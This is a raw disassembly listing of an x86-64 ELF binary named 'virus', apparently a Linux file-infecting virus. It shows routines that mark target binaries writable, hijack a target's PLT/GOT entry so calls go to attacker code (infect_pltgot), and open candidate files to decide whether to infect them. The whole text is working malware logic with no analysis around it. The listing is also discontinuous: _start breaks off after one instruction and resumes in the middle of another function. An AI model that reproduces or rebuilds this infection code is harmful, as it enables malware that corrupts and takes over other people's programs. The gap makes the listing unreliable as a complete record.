
virus:     file format elf64-x86-64


Disassembly of section .text:

000000000040019c <_start>:
  40019c:	f3 0f 1e fa          	endbr64 
  40151c:	48 c1 e0 03          	shl    rax,0x3
  401520:	48 01 c8             	add    rax,rcx
  401523:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401527:	48 85 c0             	test   rax,rax
  40152a:	0f 95 c0             	setne  al
  40152d:	0f b6 c0             	movzx  eax,al
  401530:	85 c0                	test   eax,eax
  401532:	74 0a                	je     40153e <load_target_writeable+0x1c4>
  401534:	83 f8 01             	cmp    eax,0x1
  401537:	74 6c                	je     4015a5 <load_target_writeable+0x22b>
  401539:	e9 3e 01 00 00       	jmp    40167c <load_target_writeable+0x302>
  40153e:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401545:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401549:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  40154c:	48 63 d0             	movsxd rdx,eax
  40154f:	48 89 d0             	mov    rax,rdx
  401552:	48 c1 e0 03          	shl    rax,0x3
  401556:	48 29 d0             	sub    rax,rdx
  401559:	48 c1 e0 03          	shl    rax,0x3
  40155d:	48 01 c8             	add    rax,rcx
  401560:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  401564:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40156b:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  40156f:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401576:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40157a:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  40157d:	48 63 d0             	movsxd rdx,eax
  401580:	48 89 d0             	mov    rax,rdx
  401583:	48 c1 e0 03          	shl    rax,0x3
  401587:	48 29 d0             	sub    rax,rdx
  40158a:	48 c1 e0 03          	shl    rax,0x3
  40158e:	48 01 c8             	add    rax,rcx
  401591:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  401595:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40159c:	48 89 50 30          	mov    QWORD PTR [rax+0x30],rdx
  4015a0:	e9 94 00 00 00       	jmp    401639 <load_target_writeable+0x2bf>
  4015a5:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4015ac:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4015b0:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4015b3:	48 63 d0             	movsxd rdx,eax
  4015b6:	48 89 d0             	mov    rax,rdx
  4015b9:	48 c1 e0 03          	shl    rax,0x3
  4015bd:	48 29 d0             	sub    rax,rdx
  4015c0:	48 c1 e0 03          	shl    rax,0x3
  4015c4:	48 01 c8             	add    rax,rcx
  4015c7:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  4015cb:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4015d2:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  4015d6:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4015dd:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4015e1:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4015e4:	48 63 d0             	movsxd rdx,eax
  4015e7:	48 89 d0             	mov    rax,rdx
  4015ea:	48 c1 e0 03          	shl    rax,0x3
  4015ee:	48 29 d0             	sub    rax,rdx
  4015f1:	48 c1 e0 03          	shl    rax,0x3
  4015f5:	48 01 c8             	add    rax,rcx
  4015f8:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  4015fc:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401603:	48 89 50 38          	mov    QWORD PTR [rax+0x38],rdx
  401607:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40160e:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401612:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401615:	48 63 d0             	movsxd rdx,eax
  401618:	48 89 d0             	mov    rax,rdx
  40161b:	48 c1 e0 03          	shl    rax,0x3
  40161f:	48 29 d0             	sub    rax,rdx
  401622:	48 c1 e0 03          	shl    rax,0x3
  401626:	48 01 c8             	add    rax,rcx
  401629:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]
  40162d:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401634:	48 89 50 40          	mov    QWORD PTR [rax+0x40],rdx
  401638:	90                   	nop
  401639:	eb 41                	jmp    40167c <load_target_writeable+0x302>
  40163b:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401642:	48 8b 48 50          	mov    rcx,QWORD PTR [rax+0x50]
  401646:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40164d:	48 8b 70 08          	mov    rsi,QWORD PTR [rax+0x8]
  401651:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401654:	48 63 d0             	movsxd rdx,eax
  401657:	48 89 d0             	mov    rax,rdx
  40165a:	48 c1 e0 03          	shl    rax,0x3
  40165e:	48 29 d0             	sub    rax,rdx
  401661:	48 c1 e0 03          	shl    rax,0x3
  401665:	48 01 f0             	add    rax,rsi
  401668:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  40166c:	48 8d 14 01          	lea    rdx,[rcx+rax*1]
  401670:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401677:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  40167b:	90                   	nop
  40167c:	83 45 ec 01          	add    DWORD PTR [rbp-0x14],0x1
  401680:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401687:	48 8b 00             	mov    rax,QWORD PTR [rax]
  40168a:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  40168e:	0f b7 c0             	movzx  eax,ax
  401691:	39 45 ec             	cmp    DWORD PTR [rbp-0x14],eax
  401694:	0f 8c 30 fe ff ff    	jl     4014ca <load_target_writeable+0x150>
  40169a:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4016a1:	48 8b 8d 50 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xb0]
  4016a8:	48 8b 9d 58 ff ff ff 	mov    rbx,QWORD PTR [rbp-0xa8]
  4016af:	48 89 48 68          	mov    QWORD PTR [rax+0x68],rcx
  4016b3:	48 89 58 70          	mov    QWORD PTR [rax+0x70],rbx
  4016b7:	48 8b 8d 60 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xa0]
  4016be:	48 8b 9d 68 ff ff ff 	mov    rbx,QWORD PTR [rbp-0x98]
  4016c5:	48 89 48 78          	mov    QWORD PTR [rax+0x78],rcx
  4016c9:	48 89 98 80 00 00 00 	mov    QWORD PTR [rax+0x80],rbx
  4016d0:	48 8b 8d 70 ff ff ff 	mov    rcx,QWORD PTR [rbp-0x90]
  4016d7:	48 8b 9d 78 ff ff ff 	mov    rbx,QWORD PTR [rbp-0x88]
  4016de:	48 89 88 88 00 00 00 	mov    QWORD PTR [rax+0x88],rcx
  4016e5:	48 89 98 90 00 00 00 	mov    QWORD PTR [rax+0x90],rbx
  4016ec:	48 8b 4d 80          	mov    rcx,QWORD PTR [rbp-0x80]
  4016f0:	48 8b 5d 88          	mov    rbx,QWORD PTR [rbp-0x78]
  4016f4:	48 89 88 98 00 00 00 	mov    QWORD PTR [rax+0x98],rcx
  4016fb:	48 89 98 a0 00 00 00 	mov    QWORD PTR [rax+0xa0],rbx
  401702:	48 8b 4d 90          	mov    rcx,QWORD PTR [rbp-0x70]
  401706:	48 8b 5d 98          	mov    rbx,QWORD PTR [rbp-0x68]
  40170a:	48 89 88 a8 00 00 00 	mov    QWORD PTR [rax+0xa8],rcx
  401711:	48 89 98 b0 00 00 00 	mov    QWORD PTR [rax+0xb0],rbx
  401718:	48 8b 4d a0          	mov    rcx,QWORD PTR [rbp-0x60]
  40171c:	48 8b 5d a8          	mov    rbx,QWORD PTR [rbp-0x58]
  401720:	48 89 88 b8 00 00 00 	mov    QWORD PTR [rax+0xb8],rcx
  401727:	48 89 98 c0 00 00 00 	mov    QWORD PTR [rax+0xc0],rbx
  40172e:	48 8b 4d b0          	mov    rcx,QWORD PTR [rbp-0x50]
  401732:	48 8b 5d b8          	mov    rbx,QWORD PTR [rbp-0x48]
  401736:	48 89 88 c8 00 00 00 	mov    QWORD PTR [rax+0xc8],rcx
  40173d:	48 89 98 d0 00 00 00 	mov    QWORD PTR [rax+0xd0],rbx
  401744:	48 8b 4d c0          	mov    rcx,QWORD PTR [rbp-0x40]
  401748:	48 8b 5d c8          	mov    rbx,QWORD PTR [rbp-0x38]
  40174c:	48 89 88 d8 00 00 00 	mov    QWORD PTR [rax+0xd8],rcx
  401753:	48 89 98 e0 00 00 00 	mov    QWORD PTR [rax+0xe0],rbx
  40175a:	48 8b 4d d0          	mov    rcx,QWORD PTR [rbp-0x30]
  40175e:	48 8b 5d d8          	mov    rbx,QWORD PTR [rbp-0x28]
  401762:	48 89 88 e8 00 00 00 	mov    QWORD PTR [rax+0xe8],rcx
  401769:	48 89 98 f0 00 00 00 	mov    QWORD PTR [rax+0xf0],rbx
  401770:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
  401774:	48 89 c2             	mov    rdx,rax
  401777:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40177e:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  401782:	b8 00 00 00 00       	mov    eax,0x0
  401787:	48 81 c4 b8 00 00 00 	add    rsp,0xb8
  40178e:	5b                   	pop    rbx
  40178f:	5d                   	pop    rbp
  401790:	c3                   	ret    

0000000000401791 <infect_pltgot>:
  401791:	f3 0f 1e fa          	endbr64 
  401795:	55                   	push   rbp
  401796:	48 89 e5             	mov    rbp,rsp
  401799:	48 83 ec 70          	sub    rsp,0x70
  40179d:	48 89 7d 98          	mov    QWORD PTR [rbp-0x68],rdi
  4017a1:	48 89 75 90          	mov    QWORD PTR [rbp-0x70],rsi
  4017a5:	c7 45 b4 00 00 00 00 	mov    DWORD PTR [rbp-0x4c],0x0
  4017ac:	c7 45 f8 ff ff ff ff 	mov    DWORD PTR [rbp-0x8],0xffffffff
  4017b3:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4017b7:	48 8b 40 18          	mov    rax,QWORD PTR [rax+0x18]
  4017bb:	48 89 45 a8          	mov    QWORD PTR [rbp-0x58],rax
  4017bf:	48 c7 45 c0 00 00 00 	mov    QWORD PTR [rbp-0x40],0x0
  4017c6:	00 
  4017c7:	48 c7 45 b8 00 00 00 	mov    QWORD PTR [rbp-0x48],0x0
  4017ce:	00 
  4017cf:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4017d6:	e9 67 01 00 00       	jmp    401942 <infect_pltgot+0x1b1>
  4017db:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4017de:	48 98                	cdqe   
  4017e0:	48 c1 e0 04          	shl    rax,0x4
  4017e4:	48 89 c2             	mov    rdx,rax
  4017e7:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  4017eb:	48 01 d0             	add    rax,rdx
  4017ee:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4017f1:	48 83 f8 17          	cmp    rax,0x17
  4017f5:	0f 87 43 01 00 00    	ja     40193e <infect_pltgot+0x1ad>
  4017fb:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
  401802:	00 
  401803:	48 8d 05 c6 15 00 00 	lea    rax,[rip+0x15c6]        # 402dd0 <display_skeksi+0x9d>
  40180a:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
  40180d:	48 98                	cdqe   
  40180f:	48 8d 15 ba 15 00 00 	lea    rdx,[rip+0x15ba]        # 402dd0 <display_skeksi+0x9d>
  401816:	48 01 d0             	add    rax,rdx
  401819:	3e ff e0             	notrack jmp rax
  40181c:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401820:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  401824:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401827:	48 98                	cdqe   
  401829:	48 c1 e0 04          	shl    rax,0x4
  40182d:	48 89 c1             	mov    rcx,rax
  401830:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401834:	48 01 c8             	add    rax,rcx
  401837:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40183b:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40183f:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  401843:	48 29 c1             	sub    rcx,rax
  401846:	48 89 c8             	mov    rax,rcx
  401849:	48 01 d0             	add    rax,rdx
  40184c:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  401850:	e9 e9 00 00 00       	jmp    40193e <infect_pltgot+0x1ad>
  401855:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401859:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  40185d:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401861:	48 8b 48 40          	mov    rcx,QWORD PTR [rax+0x40]
  401865:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401868:	48 98                	cdqe   
  40186a:	48 c1 e0 04          	shl    rax,0x4
  40186e:	48 89 c6             	mov    rsi,rax
  401871:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401875:	48 01 f0             	add    rax,rsi
  401878:	48 8b 70 08          	mov    rsi,QWORD PTR [rax+0x8]
  40187c:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401880:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  401884:	48 29 c6             	sub    rsi,rax
  401887:	48 89 f0             	mov    rax,rsi
  40188a:	48 01 c8             	add    rax,rcx
  40188d:	48 01 d0             	add    rax,rdx
  401890:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  401894:	e9 a5 00 00 00       	jmp    40193e <infect_pltgot+0x1ad>
  401899:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40189d:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4018a1:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4018a4:	48 98                	cdqe   
  4018a6:	48 c1 e0 04          	shl    rax,0x4
  4018aa:	48 89 c1             	mov    rcx,rax
  4018ad:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  4018b1:	48 01 c8             	add    rax,rcx
  4018b4:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4018b8:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4018bc:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  4018c0:	48 29 c1             	sub    rcx,rax
  4018c3:	48 89 c8             	mov    rax,rcx
  4018c6:	48 01 d0             	add    rax,rdx
  4018c9:	48 89 45 d8          	mov    QWORD PTR [rbp-0x28],rax
  4018cd:	eb 6f                	jmp    40193e <infect_pltgot+0x1ad>
  4018cf:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4018d2:	48 98                	cdqe   
  4018d4:	48 c1 e0 04          	shl    rax,0x4
  4018d8:	48 89 c2             	mov    rdx,rax
  4018db:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  4018df:	48 01 d0             	add    rax,rdx
  4018e2:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  4018e6:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  4018ea:	eb 52                	jmp    40193e <infect_pltgot+0x1ad>
  4018ec:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4018f0:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4018f4:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4018f7:	48 98                	cdqe   
  4018f9:	48 c1 e0 04          	shl    rax,0x4
  4018fd:	48 89 c1             	mov    rcx,rax
  401900:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401904:	48 01 c8             	add    rax,rcx
  401907:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40190b:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40190f:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  401913:	48 29 c1             	sub    rcx,rax
  401916:	48 89 c8             	mov    rax,rcx
  401919:	48 01 d0             	add    rax,rdx
  40191c:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  401920:	eb 1c                	jmp    40193e <infect_pltgot+0x1ad>
  401922:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401925:	48 98                	cdqe   
  401927:	48 c1 e0 04          	shl    rax,0x4
  40192b:	48 89 c2             	mov    rdx,rax
  40192e:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401932:	48 01 d0             	add    rax,rdx
  401935:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401939:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  40193d:	90                   	nop
  40193e:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401942:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401945:	48 98                	cdqe   
  401947:	48 c1 e0 04          	shl    rax,0x4
  40194b:	48 89 c2             	mov    rdx,rax
  40194e:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401952:	48 01 d0             	add    rax,rdx
  401955:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401958:	48 85 c0             	test   rax,rax
  40195b:	0f 85 7a fe ff ff    	jne    4017db <infect_pltgot+0x4a>
  401961:	48 83 7d f0 00       	cmp    QWORD PTR [rbp-0x10],0x0
  401966:	74 07                	je     40196f <infect_pltgot+0x1de>
  401968:	48 83 7d e0 00       	cmp    QWORD PTR [rbp-0x20],0x0
  40196d:	75 0a                	jne    401979 <infect_pltgot+0x1e8>
  40196f:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401974:	e9 af 01 00 00       	jmp    401b28 <infect_pltgot+0x397>
  401979:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401980:	eb 47                	jmp    4019c9 <infect_pltgot+0x238>
  401982:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401985:	48 63 d0             	movsxd rdx,eax
  401988:	48 89 d0             	mov    rax,rdx
  40198b:	48 01 c0             	add    rax,rax
  40198e:	48 01 d0             	add    rax,rdx
  401991:	48 c1 e0 03          	shl    rax,0x3
  401995:	48 89 c2             	mov    rdx,rax
  401998:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  40199c:	48 01 d0             	add    rax,rdx
  40199f:	8b 00                	mov    eax,DWORD PTR [rax]
  4019a1:	89 c2                	mov    edx,eax
  4019a3:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4019a7:	48 01 d0             	add    rax,rdx
  4019aa:	48 8d 35 17 14 00 00 	lea    rsi,[rip+0x1417]        # 402dc8 <display_skeksi+0x95>
  4019b1:	48 89 c7             	mov    rdi,rax
  4019b4:	e8 85 12 00 00       	call   402c3e <_strcmp>
  4019b9:	85 c0                	test   eax,eax
  4019bb:	75 08                	jne    4019c5 <infect_pltgot+0x234>
  4019bd:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4019c0:	89 45 f8             	mov    DWORD PTR [rbp-0x8],eax
  4019c3:	eb 2b                	jmp    4019f0 <infect_pltgot+0x25f>
  4019c5:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  4019c9:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4019cc:	48 63 d0             	movsxd rdx,eax
  4019cf:	48 89 d0             	mov    rax,rdx
  4019d2:	48 01 c0             	add    rax,rax
  4019d5:	48 01 d0             	add    rax,rdx
  4019d8:	48 c1 e0 03          	shl    rax,0x3
  4019dc:	48 89 c2             	mov    rdx,rax
  4019df:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4019e3:	48 01 d0             	add    rax,rdx
  4019e6:	8b 00                	mov    eax,DWORD PTR [rax]
  4019e8:	89 c0                	mov    eax,eax
  4019ea:	48 39 45 d0          	cmp    QWORD PTR [rbp-0x30],rax
  4019ee:	73 92                	jae    401982 <infect_pltgot+0x1f1>
  4019f0:	83 7d f8 ff          	cmp    DWORD PTR [rbp-0x8],0xffffffff
  4019f4:	75 0a                	jne    401a00 <infect_pltgot+0x26f>
  4019f6:	b8 ff ff ff ff       	mov    eax,0xffffffff
  4019fb:	e9 28 01 00 00       	jmp    401b28 <infect_pltgot+0x397>
  401a00:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401a07:	e9 c4 00 00 00       	jmp    401ad0 <infect_pltgot+0x33f>
  401a0c:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401a0f:	48 63 d0             	movsxd rdx,eax
  401a12:	48 89 d0             	mov    rax,rdx
  401a15:	48 01 c0             	add    rax,rax
  401a18:	48 01 d0             	add    rax,rdx
  401a1b:	48 c1 e0 03          	shl    rax,0x3
  401a1f:	48 89 c2             	mov    rdx,rax
  401a22:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401a26:	48 01 d0             	add    rax,rdx
  401a29:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401a2d:	48 c1 e8 20          	shr    rax,0x20
  401a31:	48 89 c2             	mov    rdx,rax
  401a34:	48 89 d0             	mov    rax,rdx
  401a37:	48 01 c0             	add    rax,rax
  401a3a:	48 01 d0             	add    rax,rdx
  401a3d:	48 c1 e0 03          	shl    rax,0x3
  401a41:	48 89 c2             	mov    rdx,rax
  401a44:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  401a48:	48 01 d0             	add    rax,rdx
  401a4b:	8b 00                	mov    eax,DWORD PTR [rax]
  401a4d:	89 c2                	mov    edx,eax
  401a4f:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  401a53:	48 01 d0             	add    rax,rdx
  401a56:	48 8d 35 6b 13 00 00 	lea    rsi,[rip+0x136b]        # 402dc8 <display_skeksi+0x95>
  401a5d:	48 89 c7             	mov    rdi,rax
  401a60:	e8 d9 11 00 00       	call   402c3e <_strcmp>
  401a65:	85 c0                	test   eax,eax
  401a67:	75 63                	jne    401acc <infect_pltgot+0x33b>
  401a69:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401a6c:	48 63 d0             	movsxd rdx,eax
  401a6f:	48 89 d0             	mov    rax,rdx
  401a72:	48 01 c0             	add    rax,rax
  401a75:	48 01 d0             	add    rax,rdx
  401a78:	48 c1 e0 03          	shl    rax,0x3
  401a7c:	48 89 c2             	mov    rdx,rax
  401a7f:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401a83:	48 01 d0             	add    rax,rdx
  401a86:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401a89:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
  401a8d:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401a91:	48 8b 48 40          	mov    rcx,QWORD PTR [rax+0x40]
  401a95:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401a98:	48 63 d0             	movsxd rdx,eax
  401a9b:	48 89 d0             	mov    rax,rdx
  401a9e:	48 01 c0             	add    rax,rax
  401aa1:	48 01 d0             	add    rax,rdx
  401aa4:	48 c1 e0 03          	shl    rax,0x3
  401aa8:	48 89 c2             	mov    rdx,rax
  401aab:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401aaf:	48 01 d0             	add    rax,rdx
  401ab2:	48 8b 10             	mov    rdx,QWORD PTR [rax]
  401ab5:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401ab9:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  401abd:	48 29 c2             	sub    rdx,rax
  401ac0:	48 89 d0             	mov    rax,rdx
  401ac3:	48 01 c8             	add    rax,rcx
  401ac6:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  401aca:	eb 2b                	jmp    401af7 <infect_pltgot+0x366>
  401acc:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401ad0:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401ad3:	48 63 c8             	movsxd rcx,eax
  401ad6:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401ada:	48 ba ab aa aa aa aa 	movabs rdx,0xaaaaaaaaaaaaaaab
  401ae1:	aa aa aa 
  401ae4:	48 f7 e2             	mul    rdx
  401ae7:	48 89 d0             	mov    rax,rdx
  401aea:	48 c1 e8 04          	shr    rax,0x4
  401aee:	48 39 c1             	cmp    rcx,rax
  401af1:	0f 82 15 ff ff ff    	jb     401a0c <infect_pltgot+0x27b>
  401af7:	48 83 7d c0 00       	cmp    QWORD PTR [rbp-0x40],0x0
  401afc:	75 07                	jne    401b05 <infect_pltgot+0x374>
  401afe:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401b03:	eb 23                	jmp    401b28 <infect_pltgot+0x397>
  401b05:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401b09:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  401b0d:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  401b11:	48 01 d0             	add    rax,rdx
  401b14:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  401b18:	48 8b 45 a0          	mov    rax,QWORD PTR [rbp-0x60]
  401b1c:	48 8b 55 90          	mov    rdx,QWORD PTR [rbp-0x70]
  401b20:	48 89 10             	mov    QWORD PTR [rax],rdx
  401b23:	b8 00 00 00 00       	mov    eax,0x0
  401b28:	c9                   	leave  
  401b29:	c3                   	ret    

0000000000401b2a <check_criteria>:
  401b2a:	f3 0f 1e fa          	endbr64 
  401b2e:	55                   	push   rbp
  401b2f:	48 89 e5             	mov    rbp,rsp
  401b32:	48 81 ec 00 10 00 00 	sub    rsp,0x1000
  401b39:	48 83 0c 24 00       	or     QWORD PTR [rsp],0x0
  401b3e:	48 81 ec d0 00 00 00 	sub    rsp,0xd0
  401b45:	48 89 bd 38 ef ff ff 	mov    QWORD PTR [rbp-0x10c8],rdi
  401b4c:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [rbp-0xc],0x0
  401b53:	48 8b 85 38 ef ff ff 	mov    rax,QWORD PTR [rbp-0x10c8]
  401b5a:	ba 00 00 00 00       	mov    edx,0x0
  401b5f:	be 00 00 00 00       	mov    esi,0x0
  401b64:	48 89 c7             	mov    rdi,rax
  401b67:	e8 0a 05 00 00       	call   402076 <_open>
  401b6c:	89 45 f0             	mov    DWORD PTR [rbp-0x10],eax
  401b6f:	83 7d f0 00          	cmp    DWORD PTR [rbp-0x10],0x0
  401b73:	79 0a                	jns    401b7f <check_criteria+0x55>
  401b75:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401b7a:	e9 27 01 00 00       	jmp    401ca6 <check_criteria+0x17c>
